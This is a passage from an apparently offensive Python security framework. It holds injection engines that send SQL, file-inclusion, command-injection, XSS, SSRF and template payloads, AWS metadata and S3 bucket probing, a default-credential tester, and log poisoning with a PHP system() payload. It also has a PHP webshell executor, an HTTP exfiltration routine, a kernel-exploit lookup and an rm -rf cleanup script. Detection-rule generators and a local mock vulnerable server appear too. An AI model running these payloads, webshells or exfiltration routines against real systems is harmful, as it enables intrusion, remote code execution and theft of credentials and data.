                1.0 if "sqli" in vtype else 0.0,
                1.0 if "lfi" in vtype else 0.0,
                1.0 if "ssrf" in vtype else 0.0,
                1.0 if "xss" in vtype else 0.0,
                1.0 if "cmdi" in vtype else 0.0,
                1.0 if "ssti" in vtype else 0.0,
                1.0 if "xxe" in vtype else 0.0,
                1.0 if "=" in url else 0.0,
                1.0 if any(x in url for x in ("admin","manager","console")) else 0.0,
                1.0 if "/api" in url else 0.0]
    def record_payload(self, payload_type, success):
        cur = self.state.get(f"payload:{payload_type}", {"s": 0, "n": 0})
        cur["n"] += 1
        if success: cur["s"] += 1
        self.state.set(f"payload:{payload_type}", cur)
    def payload_score(self, payload_type):
        cur = self.state.get(f"payload:{payload_type}", {"s": 0, "n": 0})
        return (cur["s"] + 1.0) / (cur["n"] + 2.0)
    def record_finding(self, vtype):
        cur = self.state.get("vuln_counts", {})
        cur[vtype] = cur.get(vtype, 0) + 1
        self.state.set("vuln_counts", cur)
    def priority_score(self, fdict):
        if self.model is not None:
            try:
                proba = self.model.predict_proba([self._features(fdict)])[0]
                return round(float(proba[1]), 3)
            except Exception as e:
                SilentPassLogger.swallowed("ml.predict", e)
        s = fdict.get("signal_score", 0.0)
        sev_w = {"critical":1.0,"high":0.8,"medium":0.5,"low":0.3,"info":0.1}.get(
            fdict.get("severity", "info"), 0.1)
        return round(0.5*s + 0.5*sev_w, 3)
    def train(self, labeled_findings):
        if not FEATURES.get("sklearn", {}).get("available"):
            return {"ok": False, "reason": "sklearn missing"}
        if len(labeled_findings) < 30:
            return {"ok": False, "reason": "need >=30 samples"}
        with self._train_lock:
            from sklearn.ensemble import GradientBoostingClassifier
            from sklearn.model_selection import train_test_split, cross_val_score
            from sklearn.metrics import roc_auc_score
            X = [self._features(f) for f, _ in labeled_findings]
            y = [1 if l else 0 for _, l in labeled_findings]
            if len(set(y)) < 2: return {"ok": False, "reason": "single class"}
            try:
                X_tr, X_te, y_tr, y_te = train_test_split(X, y, test_size=0.2,
                                                            random_state=42, stratify=y)
                model = GradientBoostingClassifier(n_estimators=100, max_depth=3,
                                                     random_state=42)
                cv = cross_val_score(model, X_tr, y_tr, cv=3, scoring="roc_auc")
                model.fit(X_tr, y_tr)
                auc = roc_auc_score(y_te, model.predict_proba(X_te)[:, 1])
                self.model = model; self._save_model()
                return {"ok": True, "cv_auc": float(cv.mean()),
                        "holdout_auc": float(auc),
                        "n_train": len(X_tr), "n_test": len(X_te)}
            except Exception as e:
                return {"ok": False, "reason": str(e)}
    def prioritize_findings(self, findings):
        return sorted(findings, key=lambda f: -self.priority_score(f))
    def state_snapshot(self):
        return {"model_loaded": self.model is not None,
                "sklearn": FEATURES.get("sklearn", {}).get("available"),
                "payload_scores": {k: self.payload_score(k)
                                    for k in ("sqli_error","sqli_time","lfi","cmdi")}}


# ═══════════════════════════════════════════════════════════════
# SECTION 18 — CLOUD ENUMERATION
# ═══════════════════════════════════════════════════════════════
class CloudEnumerator:
    def __init__(self, scanner):
        self.s = scanner; self.logger = scanner.logger
    def _wordlist(self, base):
        base = base.lower().replace(".", "-").split("-")[0][:25]
        suffixes = ["", "-backup","-backups","-dev","-prod","-staging","-test",
                    "-data","-logs","-static","-assets","-media","-public"]
        return [base+s for s in suffixes]
    def _verify_s3(self, name):
        url = f"https://{name}.s3.amazonaws.com/"
        r = self.s.get(url, timeout=5, allow_redirects=False)
        if not r: return None
        body = (r.text or "")[:5000]
        if r.status_code == 200 and "ListBucketResult" in body:
            return {"name": name, "status": "public_list", "url": url,
                    "verified": True, "marker": "ListBucketResult"}
        if r.status_code == 403 and "AccessDenied" in body:
            return {"name": name, "status": "private", "url": url,
                    "verified": True, "marker": "AccessDenied"}
        return None
    def enum_s3(self, base):
        out = []
        for name in self._wordlist(base)[:20]:
            try:
                r = self._verify_s3(name)
                if r:
                    out.append(r)
                    if r["verified"] and r["status"] == "public_list":
                        f = Finding(r["url"], f"S3 public bucket: {name}")
                        f.evidence = r
                        f.add_signal("listbucketresult_marker", 0.7)
                        f.add_signal("http_200", 0.3)
                        self.s._hit(f)
            except Exception as e:
                SilentPassLogger.swallowed("cloud.s3", e)
        return out
    def enum_aws_imds(self):
        out = []
        try:
            r = self.s.get("http://169.254.169.254/latest/meta-data/iam/security-credentials/",
                            timeout=3)
            if r and r.status_code == 200:
                out.append({"classification": "imdsv1_endpoint_open"})
        except Exception:
            out.append({"classification": "imdsv1_unreachable"})
        try:
            r = self.s._request("PUT", "http://169.254.169.254/latest/api/token",
                                 headers={"X-aws-ec2-metadata-token-ttl-seconds": "21600"},
                                 timeout=3)
            if r and r.status_code == 200:
                out.append({"classification": "imdsv2_token_obtained"})
            else:
                out.append({"classification": "imdsv2_token_denied"})
        except Exception:
            out.append({"classification": "imdsv2_token_unreachable"})
        return out
    def run(self, target, base_url=None):
        base = target.split(".")[0]
        return {"s3": self.enum_s3(base), "aws_imds": self.enum_aws_imds()}


# ═══════════════════════════════════════════════════════════════
# SECTION 19 — EXPLOIT DB
# ═══════════════════════════════════════════════════════════════
KERNEL_MAP = [
    (r"2\.6\.\d+", "CVE-2009-1185", "udev netlink", "Linux 2.6"),
    (r"3\.\d+\.\d+", "CVE-2016-5195", "Dirty COW", "Linux 3.x"),
    (r"5\.(1[0-9]|2[0-9])\.\d+", "CVE-2022-0847", "Dirty Pipe", "5.8-5.16.11"),
]
class ExploitDB:
    def __init__(self, logger):
        self.logger = logger; self.searchsploit = shutil.which("searchsploit")
    def search_local(self, query, max_results=10):
        if not self.searchsploit: return []
        try:
            r = subprocess.run([self.searchsploit, "--json", query],
                                capture_output=True, text=True, timeout=15)
            if r.returncode != 0: return []
            data = json.loads(r.stdout); out = []
            for section in ("RESULTS_EXPLOIT", "RESULTS_SHELLCODE"):
                for item in data.get(section, [])[:max_results]:
                    out.append({"title": item.get("Title", ""),
                                "path": item.get("Path", ""),
                                "type": item.get("Type", ""),
                                "match_tier": "exact"})
            return out
        except Exception as e:
            SilentPassLogger.swallowed("exploitdb.search", e)
            return []
    def match_kernel(self, ks):
        out = []
        for rx, cve, name, affects in KERNEL_MAP:
            if re.search(rx, ks, re.I):
                out.append({"cve": cve, "name": name, "affects": affects,
                            "match_tier": "heuristic"})
        return out
    def suggest_for_version(self, vs):
        if not vs: return []
        m = re.search(r"(\d+\.\d+(?:\.\d+)?)", vs)
        if not m: return []
        out = self.search_local(m.group(1))
        if "linux" in vs.lower(): out.extend(self.match_kernel(vs))
        return out


# ═══════════════════════════════════════════════════════════════
# SECTION 20 — DEFENSIVE
# ═══════════════════════════════════════════════════════════════
class SigmaGenerator:
    @staticmethod
    def from_finding(fdict):
        rule_yaml = SigmaEngine.build_rule(fdict)
        try:
            import yaml as _yaml
            return _yaml.safe_load(rule_yaml)
        except Exception: return None
    @classmethod
    def generate_all(cls, findings):
        return [r for r in (cls.from_finding(f) for f in findings) if r]
    @staticmethod
    def save(rules, path):
        try:
            with open(path, "w", encoding="utf-8") as fh:
                for r in rules:
                    fh.write("---\n"); fh.write(json.dumps(r, indent=2)); fh.write("\n")
            return path
        except OSError: return None

class YaraGenerator:
    @staticmethod
    def from_finding(fdict):
        vtype = (fdict.get("type") or "").lower()
        url = fdict.get("url", "")
        if not url: return None
        rule_name = "mega_" + re.sub(r"[^a-zA-Z0-9_]", "_", vtype)[:30]
        return {"rule": rule_name, "strings": [url.split("://")[-1][:60]],
                "meta": {"type": vtype, "generator": f"MEGA v{VERSION}"}}
    @classmethod
    def generate_all(cls, findings):
        return [r for r in (cls.from_finding(f) for f in findings) if r]
    @staticmethod
    def save(rules, path):
        try:
            with open(path, "w", encoding="utf-8") as fh:
                for r in rules:
                    fh.write(f"rule {r['rule']} {{\n")
                    fh.write("  meta:\n")
                    for k, v in r["meta"].items():
                        fh.write(f'    {k} = "{v}"\n')
                    fh.write("  strings:\n")
                    for i, s in enumerate(r["strings"]):
                        fh.write(f'    $s{i} = "{s.replace(chr(34), chr(92)+chr(34))}" ascii wide\n')
                    fh.write("  condition:\n    any of them\n}\n\n")
            return path
        except OSError: return None

class HardeningAdvisor:
    RECOMMENDATIONS = {
        "sqli": {"advice": "Parameterized queries.", "cwe": "CWE-89"},
        "xss": {"advice": "Escape output, CSP.", "cwe": "CWE-79"},
        "lfi": {"advice": "Reject path traversal.", "cwe": "CWE-22"},
        "cmdi": {"advice": "Avoid shell=True.", "cwe": "CWE-78"},
        "ssrf": {"advice": "Block private IPs.", "cwe": "CWE-918"},
        "rce": {"advice": "Patch urgently.", "cwe": "CWE-94"},
    }
    @classmethod
    def generate_all(cls, findings):
        recs = {}
        for f in findings:
            vtype = (f.get("type") or "").lower()
            for k, v in cls.RECOMMENDATIONS.items():
                if k in vtype: recs[k] = v
        return [{"issue": k, **v} for k, v in recs.items()]

class DefensiveCorrelator:
    @staticmethod
    def correlate(findings):
        by_host = defaultdict(lambda: {"types": set(), "count": 0, "critical": 0})
        for f in findings:
            url = f.get("url", "")
            host = urlparse(url).netloc if url else "unknown"
            vtype = (f.get("type") or "").lower()
            by_host[host]["types"].add(vtype.split()[0] if vtype else "?")
            by_host[host]["count"] += 1
            if f.get("severity") in ("critical", "high"):
                by_host[host]["critical"] += 1
        out = []
        for host, info in by_host.items():
            risk = ("critical" if info["critical"] >= 3 else
                    "high" if info["critical"] >= 1 else
                    "medium" if info["count"] >= 3 else "low")
            out.append({"host": host, "types": sorted(info["types"]),
                        "finding_count": info["count"],
                        "critical_findings": info["critical"],
                        "aggregate_risk": risk})
        return sorted(out, key=lambda x: -x["critical_findings"])

class DefensivePipeline:
    def __init__(self, logger=None): self.logger = logger
    def run(self, findings_dicts):
        sigma = SigmaGenerator.generate_all(findings_dicts)
        yara_rules = YaraGenerator.generate_all(findings_dicts)
        recs = HardeningAdvisor.generate_all(findings_dicts)
        corr = DefensiveCorrelator.correlate(findings_dicts)
        out = {"sigma_rules": sigma, "yara_rules": yara_rules,
               "hardening": recs, "correlations": corr}
        try:
            REPORT_DIR.mkdir(parents=True, exist_ok=True)
            if sigma:
                p = str(REPORT_DIR / "sigma_rules.yml")
                SigmaGenerator.save(sigma, p); out["sigma_path"] = p
            if yara_rules:
                p = str(REPORT_DIR / "yara_rules.yar")
                YaraGenerator.save(yara_rules, p); out["yara_path"] = p
        except OSError as e:
            SilentPassLogger.swallowed("defensive.write", e)
        return out


# ═══════════════════════════════════════════════════════════════
# SECTION 21 — ATTACK GRAPH
# ═══════════════════════════════════════════════════════════════
def _redact_cred(s):
    if not s: return ""
    if len(s) <= 4: return "***"
    return s[:2] + "***" + s[-2:]

class AttackGraph:
    def __init__(self, logger=None, use_neo4j=False, target=None):
        self.logger = logger; self.target = target or "default"
        self.g = None
        if FEATURES.get("networkx", {}).get("available"):
            import networkx as nx
            self.g = nx.MultiDiGraph()
        self.lock = threading.RLock()
        self.neo4j_driver = None
        self.use_neo4j = use_neo4j and FEATURES.get("neo4j", {}).get("available")
        if self.use_neo4j:
            try:
                from neo4j import GraphDatabase
                self.neo4j_driver = GraphDatabase.driver(NEO4J_URI,
                                                          auth=(NEO4J_USER, NEO4J_PASS))
                self.neo4j_driver.verify_connectivity()
                self._init_neo4j_schema()
            except Exception as e:
                if self.logger: self.logger.log(f"Neo4j: {e}", "warning")
                self.neo4j_driver = None; self.use_neo4j = False
    def _init_neo4j_schema(self):
        for q in [
            "CREATE CONSTRAINT h_id IF NOT EXISTS FOR (h:Host) REQUIRE h.id IS UNIQUE",
            "CREATE CONSTRAINT v_id IF NOT EXISTS FOR (v:Vuln) REQUIRE v.id IS UNIQUE",
        ]:
            with _wrap_silent("graph.neo4j.schema"):
                with self.neo4j_driver.session() as s: s.run(q)
    def _cypher(self, q, **params):
        if not self.neo4j_driver: return
        with _wrap_silent("graph.cypher"):
            with self.neo4j_driver.session() as s: s.run(q, **params)
    def _hid(self, host): return f"{self.target}::{host}"
    def _vid(self, host, vtype):
        h = hashlib.sha256(f"{self.target}::{host}::{vtype}".encode()).hexdigest()[:16]
        return f"{self.target}::vuln::{h}"
    def add_host(self, host, meta=None):
        if not self.g: return
        with self.lock: self.g.add_node(self._hid(host), type="host", host=host, **(meta or {}))
        if self.use_neo4j:
            self._cypher("MERGE (h:Host {id:$id}) SET h.host=$host, h.target=$t",
                         id=self._hid(host), host=host, t=self.target)
    def add_vuln(self, host, vtype, severity="info", evidence=None, verified=False):
        if not self.g: return
        vid = self._vid(host, vtype)
        with self.lock:
            self.g.add_node(vid, type="vuln", vtype=vtype, severity=severity,
                            evidence=evidence or {}, verified=bool(verified))
            self.g.add_edge(self._hid(host), vid, kind="vulnerable")
        if self.use_neo4j and verified:
            self._cypher("MERGE (v:Vuln {id:$id}) SET v.type=$t, v.sev=$s, v.verified=true "
                         "WITH v MATCH (h:Host {id:$h}) MERGE (h)-[:VULNERABLE]->(v)",
                         id=vid, t=vtype, s=severity, h=self._hid(host))
    def auto_discover_chains(self, entry_hosts, target_types=("vuln",)):
        if not self.g: return []
        import networkx as nx
        chains = []
        with self.lock:
            for src in entry_hosts:
                src_id = self._hid(src)
                if src_id not in self.g: continue
                for node in nx.descendants(self.g, src_id):
                    nd = self.g.nodes[node]
                    if nd.get("type") not in target_types: continue
                    if nd.get("type") == "vuln" and not nd.get("verified"): continue
                    try:
                        path = nx.shortest_path(self.g, src_id, node)
                        if len(path) <= 8:
                            chains.append({"from": src, "to": node,
                                            "path": path, "type": nd.get("type")})
                    except Exception:
                        pass
        return chains
    def to_dict(self):
        if not self.g: return {"nodes": [], "edges": []}
        with self.lock:
            return {"nodes": [{"id": n, **self.g.nodes[n]} for n in self.g.nodes],
                    "edges": [{"src": u, "dst": v, **self.g.edges[u, v, k]}
                              for u, v, k in self.g.edges(keys=True)]}
    def save(self, path=None):
        if not self.g: return None
        try:
            GRAPH_DIR.mkdir(parents=True, exist_ok=True)
            p = str(path or (GRAPH_DIR / f"attack_graph_{self.target}.json"))
            with open(p, "w", encoding="utf-8") as f:
                json.dump(self.to_dict(), f, indent=2, default=str)
            return p
        except Exception:
            return None
    def stats(self):
        if not self.g: return {"nodes": 0, "edges": 0, "types": {}, "neo4j": self.use_neo4j}
        with self.lock:
            if self.g.number_of_nodes() == 0:
                return {"nodes": 0, "edges": 0, "types": {}, "neo4j": self.use_neo4j}
            types = Counter(self.g.nodes[n].get("type", "?") for n in self.g.nodes)
            return {"nodes": self.g.number_of_nodes(),
                    "edges": self.g.number_of_edges(),
                    "types": dict(types), "neo4j": self.use_neo4j}
    def close(self):
        if self.neo4j_driver:
            with _wrap_silent("graph.close"):
                self.neo4j_driver.close()


# ═══════════════════════════════════════════════════════════════
# SECTION 22 — OPSEC
# ═══════════════════════════════════════════════════════════════
class OpsecCleaner:
    def __init__(self, logger): self.logger = logger
    def generate_local_cleanup(self):
        return r"""#!/bin/bash
set +e
if [ "${CONFIRM:-0}" != "1" ]; then
  echo "[dry-run] Set CONFIRM=1 to execute."
  exit 0
fi
rm -rf ./loot/* ./reports/* ./c2/* ./ml/* ./graph/* ./state/* 2>/dev/null
echo "cleanup done: $(date)"
"""
    def save_scripts(self):
        out = {}
        try:
            C2_DIR.mkdir(parents=True, exist_ok=True)
            lp = str(C2_DIR / "cleanup_local.sh")
            with open(lp, "w", encoding="utf-8") as f:
                f.write(self.generate_local_cleanup())
            os.chmod(lp, 0o700); out["local"] = lp
        except Exception as e:
            self.logger.log(f"opsec: {e}", "warning")
        return out
    def auto_run_local(self, confirm=False):
        try:
            lp = C2_DIR / "cleanup_local.sh"
            if not lp.exists(): self.save_scripts()
            if not lp.exists(): return {"error": "no script"}
            env = os.environ.copy()
            if confirm: env["CONFIRM"] = "1"
            r = subprocess.run(["bash", str(lp)], capture_output=True, text=True,
                                timeout=30, env=env)
            return {"dry_run": not confirm, "returncode": r.returncode,
                    "stdout": (r.stdout or "")[:500]}
        except Exception as e: return {"error": repr(e)}


# ═══════════════════════════════════════════════════════════════
# SECTION 23 — SCANNER ENGINES
# ═══════════════════════════════════════════════════════════════
class SQLiEngine:
    ERROR_SIGS = [(r"SQL syntax.*MySQL","MySQL"),(r"PostgreSQL.*ERROR","PostgreSQL"),
                   (r"Unclosed quotation mark","MSSQL"),(r"ORA-\d{5}","Oracle")]
    def __init__(self, scanner): self.s = scanner
    def _detect(self, body):
        hits = defaultdict(int)
        for rx, db in self.ERROR_SIGS:
            if re.search(rx, body, re.I): hits[db] += 1
        return max(hits.items(), key=lambda x: x[1])[0] if hits else None
    def error_based(self, url, param, method="GET"):
        sep = "&" if "?" in url else "?"
        base = self.s.get(url, timeout=self.s.task_timeout) if method == "GET" else None
        bl = base.text if base else ""
        for p in ["'", "\"", "' OR 1=1-- -"]:
            try:
                r = (self.s.post(url, data={param: p}, timeout=self.s.task_timeout)
                     if method == "POST" else
                     self.s.get(url + sep + param + "=" + quote(p, safe=""),
                                timeout=self.s.task_timeout))
                if not r: continue
                db = self._detect(r.text)
                if db and db not in bl:
                    f = Finding(url, f"SQLi error-based ({db}) p={param}")
                    f.evidence = {"payload": p, "db": db}
                    f.add_signal("db_error_string", 0.7, f"db={db}")
                    f.add_signal("baseline_clean", 0.3)
                    f.chain_next = "sqli_dump"
                    return f
            except Exception as e:
                SilentPassLogger.swallowed("sqli.error_based", e)
        return None
    def time_blind(self, url, param, method="GET", delay=5):
        sep = "&" if "?" in url else "?"
        try:
            base = self.s.get(url, timeout=self.s.task_timeout)
            if not base: return None
            t0 = time.time(); self.s.get(url, timeout=self.s.task_timeout)
            bt = time.time() - t0
        except Exception: return None
        for p in [f"' OR SLEEP({delay})-- -"]:
            try:
                t0 = time.time()
                if method == "POST": self.s.post(url, data={param: p}, timeout=delay + 15)
                else: self.s.get(url + sep + param + "=" + quote(p, safe=""), timeout=delay + 15)
                el = time.time() - t0
                if el < bt + delay * 0.75: continue
                alt = p.replace(str(delay), str(delay + 3))
                t0 = time.time()
                if method == "POST": self.s.post(url, data={param: alt}, timeout=delay + 20)
                else: self.s.get(url + sep + param + "=" + quote(alt, safe=""), timeout=delay + 20)
                el2 = time.time() - t0
                if el2 < bt + (delay + 3) * 0.75: continue
                f = Finding(url, f"SQLi time-blind p={param}")
                f.evidence = {"payload": p, "el1": el, "el2": el2, "baseline": bt}
                f.add_signal("time_delay", 0.4)
                f.add_signal("delay_scales", 0.3)
                f.add_signal("negative_control", 0.3)
                return f
            except Exception as e:
                SilentPassLogger.swallowed("sqli.time_blind", e)
        return None

class LFIEngine:
    MARKERS = [("root:x:", "passwd"), ("localhost", "hosts")]
    def __init__(self, scanner): self.s = scanner
    def test(self, url, param, method="GET"):
        for tgt in ["/etc/passwd", "/etc/hosts"]:
            for pre in ["", "..", "../", "../../", "../../../"]:
                p = pre + tgt.lstrip("/")
                if not p.startswith(("/", "..")): p = "/" + p
                try:
                    sep = "&" if "?" in url else "?"
                    r = (self.s.post(url, data={param: p}, timeout=self.s.task_timeout)
                         if method == "POST" else
                         self.s.get(url + sep + param + "=" + quote(p, safe=""),
                                    timeout=self.s.task_timeout))
                    if not r: continue
                    for mk, mt in self.MARKERS:
                        if mk in r.text:
                            f = Finding(url, f"LFI p={param} ({mt})")
                            f.evidence = {"payload": p, "marker": mk}
                            f.add_signal("marker_present", 0.7, mk)
                            f.chain_next = "lfi_to_rce"
                            return f
                except Exception as e:
                    SilentPassLogger.swallowed("lfi.test", e)
        return None
    def log_poison(self, url, param, log_path, payload):
        try:
            marker = "zqx" + secrets.token_hex(4)
            self.s._request("GET", url,
                            headers={"User-Agent": f"<?php system($_GET['c']); ?> {marker}"},
                            timeout=self.s.task_timeout)
            sep = "&" if "?" in url else "?"
            r = self.s.get(url + sep + param + "=" + quote(log_path, safe=""),
                           timeout=self.s.task_timeout)
            if r and marker in r.text:
                return {"log": log_path, "marker": marker}
        except Exception as e:
            SilentPassLogger.swallowed("lfi.log_poison", e)
        return None

class CMDIEngine:
    def __init__(self, scanner): self.s = scanner
    def test(self, url, param, method="GET"):
        sep = "&" if "?" in url else "?"
        for p, mk in [(";id", "uid="), ("|id", "uid="), ("$(id)", "uid=")]:
            try:
                r = (self.s.post(url, data={param: p}, timeout=self.s.task_timeout)
                     if method == "POST" else
                     self.s.get(url + sep + param + "=" + quote(p, safe=""),
                                timeout=self.s.task_timeout))
                if r and mk in r.text:
                    f = Finding(url, f"Command Injection p={param}")
                    f.evidence = {"payload": p, "marker": mk}
                    f.add_signal("direct_output", 0.7, mk)
                    return f
            except Exception as e:
                SilentPassLogger.swallowed("cmdi.test", e)
        return None

class XSSAnalyzer:
    def __init__(self, scanner): self.s = scanner
    def test(self, url, param, method="GET"):
        findings = []
        m = "zqx" + "".join(random.choices(string.ascii_lowercase, k=8))
        sep = "&" if "?" in url else "?"
        for tmpl, intent, req in [("<b>{m}</b>", "html_tag", {"<", ">"}),
                                   ("' onmouseover={m} x='", "attr", {"'", "="})]:
            payload = tmpl.replace("{m}", m)
            try:
                r = (self.s.post(url, data={param: payload}, timeout=self.s.task_timeout)
                     if method == "POST" else
                     self.s.get(url + sep + param + "=" + quote(payload, safe=""),
                                timeout=self.s.task_timeout))
                if not r or m not in r.text: continue
                f = Finding(url, f"XSS {intent} p={param}")
                f.evidence = {"payload": payload}
                f.add_signal("marker_reflected", 0.3)
                cleaned = re.sub(r"&(?:#\d+|#x[0-9a-fA-F]+|[a-zA-Z]+);", "", r.text)
                if {c for c in req if c in cleaned} == req:
                    f.add_signal("dangerous_chars_survived", 0.4)
                if f.independent_signals() >= 2: findings.append(f)
            except Exception as e:
                SilentPassLogger.swallowed("xss.test", e)
        return findings

class SSRFEngine:
    TARGETS = [("http://169.254.169.254/latest/meta-data/", ["ami-id", "instance-id"], "aws")]
    def __init__(self, scanner): self.s = scanner
    def test(self, url, param, method="GET"):
        sep = "&" if "?" in url else "?"
        for tgt, marks, kind in self.TARGETS:
            try:
                r = (self.s.post(url, data={param: tgt}, timeout=self.s.task_timeout)
                     if method == "POST" else
                     self.s.get(url + sep + param + "=" + quote(tgt, safe=""),
                                timeout=self.s.task_timeout))
                if not r: continue
                for mk in marks:
                    if mk in r.text:
                        f = Finding(url, f"SSRF p={param} -> {kind}")
                        f.evidence = {"payload": tgt, "marker": mk}
                        f.add_signal("marker_present", 0.7, mk)
                        return f
            except Exception as e:
                SilentPassLogger.swallowed("ssrf.test", e)
        return None

class SSTIEngine:
    DETECT = [("{{7*7}}", "49", "jinja2")]
    def __init__(self, scanner): self.s = scanner
    def test(self, url, param, method="GET"):
        sep = "&" if "?" in url else "?"
        base = self.s.get(url, timeout=self.s.task_timeout)
        bl = base.text if base else ""
        for p, exp, eng in self.DETECT:
            try:
                r = (self.s.post(url, data={param: p}, timeout=self.s.task_timeout)
                     if method == "POST" else
                     self.s.get(url + sep + param + "=" + quote(p, safe=""),
                                timeout=self.s.task_timeout))
                if r and exp in r.text and exp not in bl:
                    f = Finding(url, f"SSTI ({eng}) p={param}")
                    f.evidence = {"payload": p, "expected": exp}
                    f.add_signal("eval_result_present", 0.6, exp)
                    return f
            except Exception as e:
                SilentPassLogger.swallowed("ssti.test", e)
        return None


class DOMXSSScanner:
    SOURCES = ["location.hash", "location.search", "document.URL", "window.name"]
    SINKS = ["innerHTML", "outerHTML", "document.write", "eval("]
    def __init__(self, scanner): self.s = scanner
    def scan(self, url, body=None):
        if body is None:
            r = self.s.get(url, timeout=self.s.task_timeout)
            if not r: return []
            body = r.text
        scripts = re.findall(r"<script[^>]*>(.*?)</script>", body, re.I | re.S)
        hits = []
        for block in scripts:
            for src in self.SOURCES:
                if src in block:
                    for sink in self.SINKS:
                        if sink in block: hits.append((src, sink))
        if not hits: return []
        f = Finding(url, f"DOM XSS potential ({len(hits)} pairs)")
        f.evidence = {"pairs": hits[:10], "script_blocks": len(scripts)}
        f.add_signal("script_context_source", 0.4)
        f.add_signal("script_context_sink", 0.4)
        return [f] if f.independent_signals() >= 2 else []

class ParamDiscovery:
    COMMON = ["id","user","name","file","path","url","redirect","next","callback",
              "debug","test","admin","action","cmd","query","search","q","page"]
    def __init__(self, scanner): self.s = scanner
    def discover(self, url):
        try: base = self.s.get(url, timeout=self.s.task_timeout)
        except Exception: return []
        if not base: return []
        bl = base.text; bl_len = len(bl); found = []
        sep = "&" if "?" in url else "?"
        for p in self.COMMON[:20]:
            try:
                r = self.s.get(url + sep + p + "=zqx", timeout=self.s.task_timeout)
                if not r: continue
                delta = abs(len(r.text) - bl_len)
                if delta > 50 or r.status_code != base.status_code:
                    r2 = self.s.get(url + sep + p + "=otherval", timeout=self.s.task_timeout)
                    if r2 and abs(len(r2.text) - bl_len) > 50: found.append(p)
            except Exception as e:
                SilentPassLogger.swallowed("param.discover", e)
        return found

class LDAPTester:
    def __init__(self, scanner): self.s = scanner
    def test(self, url, param, method="GET"):
        sep = "&" if "?" in url else "?"
        base = self.s.get(url, timeout=self.s.task_timeout)
        bl = base.text if base else ""
        for p in ["*", "*)(&"]:
            try:
                r = (self.s.post(url, data={param: p}, timeout=self.s.task_timeout)
                     if method == "POST" else
                     self.s.get(url + sep + param + "=" + quote(p, safe=""),
                                timeout=self.s.task_timeout))
                if not r: continue
                delta = len(r.text) - len(bl)
                if delta > 200:
                    f = Finding(url, f"LDAP injection possible p={param}")
                    f.evidence = {"payload": p, "delta_len": delta}
                    f.add_signal("response_delta_large", 0.4)
                    f.add_signal("ldap_wildcard_effect", 0.3)
                    if f.independent_signals() >= 2: return f
            except Exception as e:
                SilentPassLogger.swallowed("ldap.test", e)
        return None

class XPathTester:
    def __init__(self, scanner): self.s = scanner
    def test(self, url, param, method="GET"):
        sep = "&" if "?" in url else "?"
        for p in ["' or '1'='1", "' and '1'='2"]:
            try:
                r = (self.s.post(url, data={param: p}, timeout=self.s.task_timeout)
                     if method == "POST" else
                     self.s.get(url + sep + param + "=" + quote(p, safe=""),
                                timeout=self.s.task_timeout))
                if r and r.status_code == 200:
                    f = Finding(url, f"XPath injection possible p={param}")
                    f.evidence = {"payload": p}
                    f.add_signal("payload_accepted", 0.3)
                    f.add_signal("specific_xpath_payload", 0.3)
                    if f.independent_signals() >= 2: return f
            except Exception as e:
                SilentPassLogger.swallowed("xpath.test", e)
        return None

class CredTester:
    DEFAULT_CREDS = {"tomcat_manager": {"path": "/manager/html", "auth": "basic",
                                         "creds": [("tomcat", "tomcat")]}}
    def __init__(self, scanner): self.s = scanner
    def test_all(self, base_url):
        findings = []
        for name, cfg in self.DEFAULT_CREDS.items():
            url = base_url.rstrip("/") + cfg["path"]
            if cfg["auth"] == "basic":
                for u, p in cfg["creds"]:
                    token = base64.b64encode(f"{u}:{p}".encode()).decode()
                    r = self.s._request("GET", url, timeout=6,
                                        headers={"Authorization": f"Basic {token}"})
                    if r and r.status_code == 200:
                        r2 = self.s._request("GET", url, timeout=6)
                        if not r2 or r2.status_code in (401, 403):
                            f = Finding(base_url, f"Default creds {name} {u}:{p}")
                            f.evidence = {"service": name, "user": u, "pass": _redact_cred(p)}
                            f.add_signal("auth_200", 0.5)
                            f.add_signal("unauth_fails", 0.4)
                            findings.append(f); break
        return findings

class WebshellManager:
    SHELLS = {"php_simple": '<?php if(isset($_REQUEST["c"])){system($_REQUEST["c"]);} ?>'}
    def __init__(self, scanner): self.s = scanner
    def exec_cmd(self, shell_info, cmd):
        try:
            if "url" in shell_info:
                sep = "&" if "?" in shell_info["url"] else "?"
                url = shell_info["url"] + sep + shell_info.get("cmd_param", "c") + "=" + quote(cmd)
                r = self.s.get(url, timeout=15)
                return r.text if r else None
        except Exception as e:
            SilentPassLogger.swallowed("webshell.exec", e)
        return None

class Exfiltrator:
    def __init__(self, logger=None): self.logger = logger
    def exfil_http(self, data, dest_url):
        try:
            requests.post(dest_url, data=data, timeout=10, verify=False); return True
        except Exception: return False
    def chunk_b64(self, data, size=100):
        b = base64.b64encode(data.encode() if isinstance(data, str) else data).decode()
        return [b[i:i+size] for i in range(0, len(b), size)]


# ═══════════════════════════════════════════════════════════════
# SECTION 24 — MOCK VULN TARGET
# ═══════════════════════════════════════════════════════════════
class MockVulnHandler(BaseHTTPRequestHandler):
    def log_message(self, *a, **k): pass
    def _send(self, code, body, ctype="text/html"):
        self.send_response(code)
        self.send_header("Content-Type", ctype)
        self.send_header("Server", "nginx/1.24.0")
        self.end_headers()
        self.wfile.write(body.encode() if isinstance(body, str) else body)
    def do_GET(self):
        p = urlparse(self.path); qs = parse_qs(p.query)
        if p.path == "/health":
            self._send(200, '{"ok":true}', "application/json"); return
        if p.path == "/search":
            q = (qs.get("q") or [""])[0]
            if "'" in q or '"' in q:
                self._send(500, "SQL syntax error near '" + q + "' in MySQL server")
            else: self._send(200, f"<html>{q}</html>")
        elif p.path == "/view":
            f = (qs.get("file") or [""])[0]
            if "passwd" in f: self._send(200, "root:x:0:0:root:/root:/bin/bash")
            else: self._send(404, "no")
        elif p.path == "/ping":
            h = (qs.get("host") or [""])[0]
            if any(x in h for x in (";","|","$(")):
                self._send(200, "uid=33(www-data) gid=33(www-data)")
            else: self._send(200, f"PING {h}: ok")
        elif p.path == "/echo":
            x = (qs.get("x") or [""])[0]
            self._send(200, f"<html>You said: {x}</html>")
        elif p.path == "/template":
            t = (qs.get("t") or [""])[0]
            if "{{7*7}}" in t: self._send(200, "Result: 49")
            else: self._send(200, f"Result: {t}")
        elif p.path == "/.env":
            self._send(200, "DB_PASS=secret123\nAWS_KEY=AKIAIOSFODNN7EXAMPLE\n")
        else: self._send(200, "<html>Mock</html>")

class MockVulnServer:
    def __init__(self, host="127.0.0.1", port=18080):
        self.host = host; self.port = port
        self.srv = None; self.thread = None
    def start(self):
        self.srv = ThreadingHTTPServer((self.host, self.port), MockVulnHandler)
        self.thread = threading.Thread(target=self.srv.serve_forever, daemon=True)
        self.thread.start(); return True
    def stop(self):
        with _wrap_silent("mockvuln.stop"):
